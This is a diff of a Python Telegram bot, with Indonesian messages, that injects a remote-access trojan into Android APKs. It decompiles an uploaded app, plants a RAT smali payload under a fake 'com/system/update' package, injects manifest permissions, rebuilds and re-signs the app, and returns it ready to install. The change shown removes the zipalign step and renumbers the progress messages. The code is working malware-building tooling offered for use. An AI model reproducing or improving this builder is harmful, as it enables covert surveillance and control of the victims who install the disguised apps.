@@ -107,7 +107,7 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         zip_path = f"{WORK_DIR}/backup_r4t.zip"
         try:
             with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-                for file in ["builder_bot.py", "app_debug.keystore", "zipalign", "devices.db"]:
+                for file in ["builder_bot.py", "app_debug.keystore", "devices.db"]:
                     filepath = f"{WORK_DIR}/{file}"
                     if os.path.exists(filepath):
                         zipf.write(filepath, file)
@@ -163,10 +163,10 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
     apk_new_path = f"{session_dir}/modded.apk"
     
     try:
-        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔧 [1/5] Membongkar APK...")
+        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔧 [1/4] Membongkar APK...")
         subprocess.run(f"apktool d '{file_path}' -o '{apk_out_dir}' -f", shell=True, check=True, capture_output=True)
 
-        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="💉 [2/5] Menyuntikkan kode RAT...")
+        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="💉 [2/4] Menyuntikkan kode RAT...")
         target_smali_dir = f"{apk_out_dir}/smali/com/system/update"
         os.makedirs(target_smali_dir, exist_ok=True)
         if os.path.exists(PAYLOAD_SMALI_DIR):
@@ -176,18 +176,15 @@ async def process_apk(update: Update, context: ContextTypes.DEFAULT_TYPE, file_p
         else:
             raise Exception(f"Folder {PAYLOAD_SMALI_DIR} tidak ditemukan! Pastikan udah diekstrak.")
 
-        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="📝 [3/5] Menyuntikkan Izin ke Manifest...")
+        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="📝 [3/4] Menyuntikkan Izin & Merakit Ulang...")
         inject_manifest(f"{apk_out_dir}/AndroidManifest.xml")
-
-        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="📦 [4/5] Merakit ulang APK...")
         subprocess.run(f"apktool b '{apk_out_dir}' -o '{apk_new_path}'", shell=True, check=True, capture_output=True)
 
-        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔐 [5/5] Menandatangani APK...")
+        await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="🔐 [4/4] Menandatangani APK...")
         signed_apk = f"{apk_new_path}.signed.apk"
         
-        # NGGAK PAKE JAR LAGI, LANGSUNG PANGGIL ZIPALIGN BAWAAN TERMUX
-        subprocess.run(f"zipalign -p -f 4 '{apk_new_path}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
-        subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}.aligned.apk'", shell=True, check=True, capture_output=True)
+        # LANGSUNG SIGN TANPA ZIPALIGN
+        subprocess.run(f"apksigner sign --ks {KEYSTORE_PATH} --ks-pass pass:{KEYSTORE_PASS} --ks-key-alias {KEY_ALIAS} --out '{signed_apk}' '{apk_new_path}'", shell=True, check=True, capture_output=True)
 
         await context.bot.send_message(chat_id=ALLOWED_CHAT_ID, text="✅ **BUILD SUKSES!** APK siap di-install:", parse_mode='Markdown')
         with open(signed_apk, "rb") as f:
